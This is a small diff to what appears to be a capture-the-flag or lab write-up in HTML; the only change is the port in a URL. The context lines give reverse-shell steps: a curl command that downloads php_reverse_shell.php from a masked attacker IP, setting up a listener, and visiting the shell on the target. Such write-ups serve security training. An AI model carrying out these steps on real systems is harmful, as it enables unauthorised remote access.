@@ -208,7 +208,7 @@ Host script results:
 - updated the IP<br>
 - executed: <code>curl http://xx.xxx.xxx.xx:8000/php_reverse_shell.php -o php_reverse_shell.php</code><br>
 - setup a listener<br>
-- navigated to <code>stealth.com:8080/php_reverse_shell.php</code></p>
+- navigated to <code>stealth.com:8443/php_reverse_shell.php</code></p>
 
 <br>
 <br>
